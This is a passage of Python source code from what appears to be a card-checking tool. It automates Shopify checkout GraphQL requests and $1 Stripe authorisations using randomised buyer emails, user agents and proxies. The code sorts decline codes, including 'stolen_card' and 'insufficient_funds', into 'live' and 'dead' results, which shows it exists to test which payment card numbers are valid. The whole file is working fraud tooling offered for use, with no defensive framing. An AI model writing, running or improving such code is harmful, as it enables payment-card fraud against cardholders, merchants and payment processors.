    Returns True if negotiation succeeded (shipping_handle + actual_total obtained).
    """
    if not ctx.session_token or not ctx.checkout_id:
        return False

    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers["accept"] = "application/json"
    headers["content-type"] = "application/json"
    headers["shopify-checkout-client"] = "checkout-web/1.0"
    headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
    headers["x-checkout-web-source-id"] = ctx.checkout_id
    headers["x-checkout-one-session-token"] = ctx.session_token

    address = ctx.address

    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": address["address1"],
                "address2": "",
                "city": address["city"],
                "countryCode": address["countryCode"],
                "firstName": address["firstName"],
                "lastName": address["lastName"],
                "zoneCode": address["zoneCode"],
                "postalCode": address["postalCode"],
                "phone": address["phone"],
                "oneTimeUse": False,
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": "any",
                "customDeliveryRate": False,
            }
        },
        "expectedTotalPrice": {"any": True},
    }

    billing_addr = {
        "address1": address["address1"],
        "city": address["city"],
        "countryCode": address["countryCode"],
        "firstName": address["firstName"],
        "lastName": address["lastName"],
        "zoneCode": address["zoneCode"],
        "postalCode": address["postalCode"],
        "phone": address["phone"],
    }

    payload = {
        "operationName": "Proposal",
        "query": _PROPOSAL_QUERY,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True,
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_addr},
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": ctx.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{ctx.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{ctx.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": [],
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                "email": random_email(address["firstName"], address["lastName"]),
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": ctx.session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": [],
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []},
        },
    }

    max_polls = 8
    shipping_handle = None
    shipping_amount = None
    actual_total = None
    currency_code = "USD"
    delivery_expectations = []
    queue_token = None

    for attempt in range(max_polls):
        try:
            async with session.post(url, json=payload, headers=headers) as r:
                if r.status != 200:
                    await asyncio.sleep(1)
                    continue

                try:
                    data = await r.json()
                except Exception:
                    await asyncio.sleep(1)
                    continue

                if "errors" in data and not data.get("data"):
                    await asyncio.sleep(1)
                    continue

                result = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
                if result.get("__typename") != "NegotiationResultAvailable":
                    await asyncio.sleep(0.5)
                    continue

                queue_token = result.get("queueToken")
                sp = result.get("sellerProposal", {})

                # ── Extract delivery terms ──
                dt = sp.get("delivery", {})
                dt_type = dt.get("__typename")
                if dt_type == "FilledDeliveryTerms":
                    lines = dt.get("deliveryLines", [])
                    if lines:
                        strategies = lines[0].get("availableDeliveryStrategies", [])
                        if strategies:
                            shipping_handle = strategies[0].get("handle")
                            amt = strategies[0].get("amount", {})
                            if amt.get("__typename") == "MoneyValueConstraint":
                                shipping_amount = amt.get("value", {}).get("amount")

                            # Update delivery_line with actual handle for next poll
                            delivery_line["selectedDeliveryStrategy"] = {
                                "deliveryStrategyByHandle": {
                                    "handle": shipping_handle,
                                    "customDeliveryRate": False,
                                },
                                "options": {"phone": address["phone"]},
                            }
                            if shipping_amount:
                                delivery_line["expectedTotalPrice"] = {
                                    "value": {"amount": str(shipping_amount), "currencyCode": "USD"}
                                }
                            payload["variables"]["delivery"]["deliveryLines"][0] = delivery_line

                # ── Extract checkout total ──
                ct = sp.get("checkoutTotal", {})
                if ct.get("__typename") == "MoneyValueConstraint":
                    val = ct.get("value", {})
                    actual_total = val.get("amount")
                    currency_code = val.get("currencyCode", "USD")

                # ── Extract delivery expectations ──
                de = sp.get("deliveryExpectations", {})
                de_type = de.get("__typename")
                if de_type == "FilledDeliveryExpectationTerms":
                    expectations = de.get("deliveryExpectations", [])
                    for exp in expectations:
                        sh = exp.get("signedHandle")
                        if sh:
                            delivery_expectations.append({"signedHandle": sh})

                # ── Check if we have everything ──
                if shipping_handle and actual_total and delivery_expectations:
                    break

                # ── Handle pending ──
                poll_delay = 500
                if dt_type == "PendingTerms":
                    poll_delay = dt.get("pollDelay", 500)
                elif de_type == "PendingTerms":
                    poll_delay = de.get("pollDelay", 500)
                wait = min(poll_delay / 1000.0, 5.0)
                await asyncio.sleep(wait)

        except Exception as e:
            logger.debug("negotiate_proposal attempt %d error: %s", attempt, e)
            await asyncio.sleep(1)

    # Store negotiation results in context
    ctx.shipping_handle = shipping_handle
    ctx.shipping_amount = shipping_amount
    ctx.actual_total = actual_total
    ctx.currency_code = currency_code
    ctx.delivery_expectations = delivery_expectations
    if queue_token:
        ctx.queue_token = queue_token

    return bool(shipping_handle and actual_total)


async def _submit_for_completion(session, ctx: _CheckoutContext, card: Card, vault_id: str) -> Optional[str]:
    """Step 7: SubmitForCompletion GraphQL mutation.

    Uses Proposal negotiation data (shipping_handle, actual_total, queue_token)
    to build a valid submission that Shopify will accept.
    """
    if not ctx.session_token or not ctx.checkout_id:
        return None

    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers["accept"] = "application/json"
    headers["content-type"] = "application/json"
    headers["origin"] = ctx.base_url
    headers["referer"] = ctx.checkout_url
    headers["shopify-checkout-client"] = "checkout-web/1.0"
    headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
    headers["x-checkout-one-session-token"] = ctx.session_token
    headers["x-checkout-web-deploy-stage"] = "production"
    headers["x-checkout-web-server-handling"] = "fast"
    headers["x-checkout-web-server-rendering"] = "yes"
    headers["x-checkout-web-source-id"] = ctx.checkout_id
    headers["x-checkout-web-build-id"] = ctx.build_id

    address = ctx.address
    attempt_token = f"{ctx.checkout_id}-{uuid.uuid4().hex[:10]}"
    card_bin = card.number[:8]
    buyer_email = random_email(address['firstName'], address['lastName'])

    # Use Proposal data if available, fall back to signed_handles / defaults
    shipping_handle = ctx.shipping_handle or "any"
    actual_total = ctx.actual_total or str(ctx.price)
    currency_code = ctx.currency_code or "USD"
    delivery_expectation_lines = ctx.delivery_expectations or [{"signedHandle": sh} for sh in ctx.signed_handles]

    # Payment method identifier — use extracted one, hardcoded fallback (NOT vault_id)
    pm_identifier = ctx.payment_method_identifier or "733e0067953851d75a089254f3ab0445"

    # Build delivery strategy — use negotiated handle if available
    if shipping_handle != "any":
        delivery_strategy = {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False,
            },
            "options": {"phone": address["phone"]},
        }
    else:
        delivery_strategy = {
            "deliveryStrategyMatchingConditions": {
                "estimatedTimeInTransit": {"any": True},
                "shipments": {"any": True},
            },
            "options": {"phone": address["phone"]},
        }

    # Build delivery line — use full streetAddress (Proposal confirmed it)
    delivery_line = {
        "destination": {
            "streetAddress": {
                "address1": address["address1"],
                "address2": "",
                "city": address["city"],
                "countryCode": address["countryCode"],
                "postalCode": address["postalCode"],
                "company": address.get("company", ""),
                "firstName": address["firstName"],
                "lastName": address["lastName"],
                "zoneCode": address["zoneCode"],
                "phone": address["phone"],
            }
        },
        "selectedDeliveryStrategy": delivery_strategy,
        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {"any": True} if not ctx.shipping_amount else {
            "value": {"amount": str(ctx.shipping_amount), "currencyCode": currency_code}
        },
        "destinationChanged": False,
    }

    billing_addr = {
        "address1": address["address1"],
        "address2": "",
        "city": address["city"],
        "countryCode": address["countryCode"],
        "postalCode": address["postalCode"],
        "company": address.get("company", ""),
        "firstName": address["firstName"],
        "lastName": address["lastName"],
        "zoneCode": address["zoneCode"],
        "phone": address["phone"],
    }

    payload = {
        "query": _SUBMIT_MUTATION,
        "operationName": "SubmitForCompletion",
        "variables": {
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {
                "requestUrl": ctx.checkout_url,
                "pageId": str(uuid.uuid4()).upper(),
            },
            "input": {
                "sessionInput": {"sessionToken": ctx.session_token},
                "queueToken": ctx.queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [delivery_line],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": delivery_expectation_lines,
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": ctx.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{ctx.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{ctx.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponents": [],
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {
                        "value": {"amount": str(actual_total), "currencyCode": currency_code}
                    },
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": pm_identifier,
                                "sessionId": vault_id,
                                "billingAddress": {"streetAddress": billing_addr},
                                "cardSource": None,
                            }
                        },
                        "amount": {
                            "value": {"amount": str(actual_total), "currencyCode": currency_code}
                        },
                    }],
                    "billingAddress": {"streetAddress": billing_addr},
                    "creditCardBin": card_bin,
                },
                "buyerIdentity": {
                    "customer": {
                        "presentmentCurrency": currency_code,
                        "countryCode": "US",
                    },
                    "email": buyer_email,
                    "emailChanged": False,
                    "phoneCountryCode": "US",
                    "marketingConsent": [
                        {"sms": {"consentState": "DECLINED", "value": address["phone"], "countryCode": "US"}},
                        {"email": {"consentState": "GRANTED", "value": buyer_email}},
                    ],
                    "shopPayOptInPhone": {
                        "number": address["phone"],
                        "countryCode": "US",
                    },
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "taxes": {"proposedTotalAmount": {"any": True}},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None,
                    "signatureUuid": None,
                    "lineItemScriptChanges": [],
                    "paymentScriptChanges": [],
                    "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
                "captcha": None,
                "cartMetafields": [],
            },
        },
    }

    max_retries = 12
    ctx.submit_start_time = time.time()
    for attempt in range(max_retries):
        try:
            async with session.post(url, json=payload, headers=headers) as r:
                try:
                    res = await r.json()
                except Exception:
                    return None

                if "errors" in res and res.get("data") is None:
                    return None

                data = res.get("data", {})
                submit = data.get("submitForCompletion", {})
                typename = submit.get("__typename", "")

                if typename in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                    receipt = submit.get("receipt", {})
                    return receipt.get("id")

                elif typename == "SubmitFailed":
                    reason = submit.get("reason", "unknown")
                    logger.debug("SubmitFailed: %s", reason)
                    return None

                elif typename == "Throttled":
                    poll_after = submit.get("pollAfter", 1000)
                    ctx.queue_token = submit.get("queueToken", ctx.queue_token)
                    await asyncio.sleep(poll_after / 1000.0)
                    payload["variables"]["input"]["queueToken"] = ctx.queue_token
                    continue

                elif typename == "CheckpointDenied":
                    return None

                elif typename == "SubmitRejected":
                    errors = submit.get("errors", [])
                    codes = [e.get("code", "") for e in errors]
                    logger.debug("SubmitRejected: %s", codes)
                    if "WAITING_PENDING_TERMS" in codes:
                        await asyncio.sleep(0.5)
                        continue
                    return None

                else:
                    backoff = min(0.5 * (1.5 ** attempt), 10.0)
                    await asyncio.sleep(backoff)
                    if attempt < max_retries - 1:
                        continue
                    return None
        except Exception as e:
            logger.debug("submit_for_completion attempt %d failed: %s", attempt, e)
            backoff = min(0.5 * (1.5 ** attempt), 10.0)
            await asyncio.sleep(backoff)

    return None


async def _poll_for_receipt(session, ctx: _CheckoutContext, receipt_id: str, card: Card) -> tuple:
    """Step 8: Poll for receipt status. Uses its own session with long timeout."""
    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers["accept"] = "application/json"
    headers["content-type"] = "application/json"
    headers["referer"] = ctx.checkout_url
    headers["shopify-checkout-client"] = "checkout-web/1.0"
    headers["shopify-checkout-source"] = f'id="{ctx.checkout_id}", type="cn"'
    headers["x-checkout-one-session-token"] = ctx.session_token
    headers["x-checkout-web-deploy-stage"] = "production"
    headers["x-checkout-web-server-handling"] = "fast"
    headers["x-checkout-web-server-rendering"] = "no"
    headers["x-checkout-web-source-id"] = ctx.checkout_id
    headers["x-checkout-web-build-id"] = ctx.build_id

    poll_payload = {
        "query": _POLL_QUERY,
        "operationName": "PollForReceipt",
        "variables": {
            "receiptId": receipt_id,
            "sessionToken": ctx.session_token,
        },
    }

    # Create a separate session with long timeout for polling
    poll_session_kwargs = {"timeout": 120}
    if ctx._proxy:
        poll_session_kwargs["proxy"] = ctx._proxy

    async with CffiClientSession(**poll_session_kwargs) as poll_session:
        for i in range(15):
            try:
                async with poll_session.post(url, json=poll_payload, headers=headers) as r:
                    data = await r.json()
                    receipt = data.get("data", {}).get("receipt", {})
                tn = receipt.get("__typename", "")

                if tn == "ProcessedReceipt" or "orderIdentity" in receipt:
                    order_id = receipt.get("orderIdentity", {}).get("id", "N/A")
                    return ("CHARGED", f"Order ID: {order_id}")

                elif tn == "ActionRequiredReceipt":
                    action = receipt.get("action", {})
                    action_url = action.get("url", "") or action.get("offsiteRedirect", "")
                    if not action_url and action.get("challengeData"):
                        try:
                            cdata = json.loads(action["challengeData"])
                            action_url = cdata.get("acsUrl", "") or cdata.get("url", "")
                        except Exception:
                            action_url = str(action.get("challengeData", ""))
                    if action_url:
                        return ("LIVE_3DS", "3ds_required")
                    return ("LIVE_3DS", "3ds_challenge_unparsed")

                elif tn == "FailedReceipt":
                    err = receipt.get("processingError", {})
                    code = err.get("code", "UNKNOWN")
                    msg = err.get("messageUntranslated", "")
                    
                    # Compute duration
                    duration = time.time() - ctx.submit_start_time
                    return _classify_failure(code, msg, duration)

                elif tn in ("ProcessingReceipt", "WaitingReceipt"):
                    delay = receipt.get("pollDelay", 4000)
                    await asyncio.sleep(delay / 1000.0)
                    continue

            except Exception as e:
                logger.debug("poll_for_receipt attempt %d failed: %s", i + 1, e)
            await asyncio.sleep(3)

    return ("ERROR", "Polling timed out")


def _classify_failure(code: str, msg: str, duration: float = 0.0) -> tuple:
    """Classify a payment failure response with time heuristics."""
    code_lower = (code or "").lower()
    msg_lower = (msg or "").lower()

    LIVE_CODES = {"insufficient_funds", "call_issuer", "do_not_honor", "pickup_card", "test_mode_live_card", "transaction_not_allowed", "amount_too_large", "withdrawal_limit_exceeded"}
    DEAD_CODES = {
        "card_declined", "incorrect_cvc", "invalid_cvc", "invalid_number",
        "expired_card", "generic_decline", "processor_declined", "fraudulent",
        "stolen_card", "lost_card", "invalid_expiry_month", "invalid_expiry_year",
        "blocked", "security_violation", "invalid_zip", "incorrect_number",
        "card_velocity_exceeded", "rejected", "processing_error", "reenter_transaction"
    }

    # Time heuristics
    if duration > 0.0:
        if duration < 1.2 and code_lower == "generic_decline":
            # Fast generic declines are often processor AVS/CVV blocks
            return ("DEAD", f"{code} — {msg} (fast_decline)")
        if duration > 3.0 and code_lower in ("generic_decline", "card_declined"):
            # Slow generic declines often indicate bank-level soft declines
            pass # Continue to exact match logic, but logged internally as slow

    # Exact match on code first
    if code_lower in LIVE_CODES:
        return ("APPROVED", f"{code} — {msg}")
    if code_lower in DEAD_CODES:
        return ("DECLINED", f"{code} — {msg}")

    # Then check message as substring (less precise but catches edge cases)
    for lc in LIVE_CODES:
        if lc in msg_lower:
            return ("APPROVED", f"{code} — {msg}")
    for dc in DEAD_CODES:
        if dc in msg_lower:
            return ("DECLINED", f"{code} — {msg}")

    if code and code != "UNKNOWN":
        return ("DECLINED", f"{code} — {msg}")
    return ("DECLINED", msg or "unknown_decline")


# ═════════════════════════════════════════════════════════════════════════
# STRIPE CHECK — $1 auth via Stripe secret key
# ═════════════════════════════════════════════════════════════════════════

STRIPE_ERROR_MAP = {
    "succeeded":              ("CHARGED", "succeeded"),
    "requires_action":        ("LIVE_3DS", "3ds_required"),
    "insufficient_funds":     ("LIVE", "insufficient_funds"),
    "card_declined":          ("DEAD", "card_declined"),
    "incorrect_cvc":          ("DEAD", "incorrect_cvc"),
    "invalid_number":         ("DEAD", "invalid_number"),
    "expired_card":           ("DEAD", "expired_card"),
    "processing_error":       ("DEAD", "processing_error"),
    "incorrect_number":       ("DEAD", "incorrect_number"),
    "generic_decline":        ("DEAD", "generic_decline"),
    "invalid_expiry_month":   ("DEAD", "invalid_expiry_month"),
    "invalid_expiry_year":    ("DEAD", "invalid_expiry_year"),
    "invalid_cvc":            ("DEAD", "incorrect_cvc"),
}


def _classify_stripe_error(body: dict) -> tuple[str, str]:
    """Classify a Stripe API error response."""
    err = body.get("error", {})
    code = err.get("decline_code") or err.get("code") or err.get("type", "")
    code_lower = str(code).lower()

    for key, (status, msg) in STRIPE_ERROR_MAP.items():
        if key in code_lower:
            return status, msg

    message = str(err.get("message", "")).lower()
    for key, (status, msg) in STRIPE_ERROR_MAP.items():
        if key in message:
            return status, msg

    if code:
        return "DEAD", code
    return "DEAD", "unknown_decline"


async def stripe_check(
    card: Card,
    proxy: Optional[str] = None,
    timeout: int = 15,
    secret_key: str = "",
) -> CheckResult:
    """Run a $1 auth check via Stripe secret key."""
    if not secret_key:
        return CheckResult(
            status="DEAD", message="stripe_not_configured",
            gateway="Stripe", price=1.0,
            store="stripe-api", card=card,
        )

    conn_timeout = aiohttp.ClientTimeout(total=timeout)
    connector = _get_shared_connector()
    session_kwargs = {"timeout": conn_timeout, "connector": connector}

    if proxy:
        session_kwargs["proxy"] = proxy

    try:
        async with aiohttp.ClientSession(**session_kwargs) as session:
            pm_result = await _stripe_create_pm(session, card, secret_key)
            if not pm_result["ok"]:
                status, msg = _classify_stripe_error(pm_result["body"])
                return CheckResult(
                    status=status, message=msg,
                    gateway="Stripe", price=1.0,
                    store="stripe-api", card=card,
                )

            pm_id = pm_result["pm_id"]
            pi_result = await _stripe_confirm_intent(session, pm_id, secret_key)
            body = pi_result["body"]

            if pi_result["status"] == 200:
                pi_status = body.get("status", "")
                if pi_status == "succeeded":
                    return CheckResult("CHARGED", "succeeded", "Stripe", 1.0, "stripe-api", card)
                elif pi_status == "requires_action":
                    return CheckResult("LIVE_3DS", "3ds_required", "Stripe", 1.0, "stripe-api", card)
                elif pi_status == "requires_payment_method":
                    return CheckResult("LIVE", "requires_payment_method", "Stripe", 1.0, "stripe-api", card)
                elif pi_status == "processing":
                    return CheckResult("LIVE", "processing", "Stripe", 1.0, "stripe-api", card)
                else:
                    s, m = _classify_stripe_error(body)
                    return CheckResult(s, m, "Stripe", 1.0, "stripe-api", card)
            else:
                s, m = _classify_stripe_error(body)
                return CheckResult(s, m, "Stripe", 1.0, "stripe-api", card)

    except Exception as e:
        logger.warning("Stripe check error: %s", e)
        return CheckResult("DEAD", f"error: {e}", "Stripe", 1.0, "stripe-api", card)


async def _stripe_create_pm(session: aiohttp.ClientSession, card: Card, secret_key: str) -> dict:
    """Create a Stripe payment method from card details using secret key."""
    prof = random_profile()
    headers = {
        "User-Agent": prof.ua,
        "Authorization": f"Bearer {secret_key}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = {
        "type": "card",
        "card[number]": card.number,
        "card[exp_month]": card.month,
        "card[exp_year]": card.year,
        "card[cvc]": card.cvv,
    }

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            data=data,
            headers=headers,
        ) as resp:
            body = await resp.json()
            if resp.status == 200 and "id" in body:
                return {"ok": True, "pm_id": body["id"], "body": body}
            return {"ok": False, "pm_id": None, "body": body}
    except Exception as e:
        return {"ok": False, "pm_id": None, "body": {"error": {"message": str(e)}}}


async def _stripe_confirm_intent(session: aiohttp.ClientSession, pm_id: str, secret_key: str) -> dict:
    """Create + confirm a $1 PaymentIntent using secret key."""
    prof = random_profile()
    headers = {
        "User-Agent": prof.ua,
        "Authorization": f"Bearer {secret_key}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_intents",
            data={
                "amount": "100",
                "currency": "usd",
                "payment_method": pm_id,
                "confirm": "true",
                "capture_method": "manual",
            },
            headers=headers,
        ) as resp:
            body = await resp.json()
            return {"status": resp.status, "body": body}
    except Exception as e:
        return {"status": 0, "body": {"error": {"message": str(e)}}}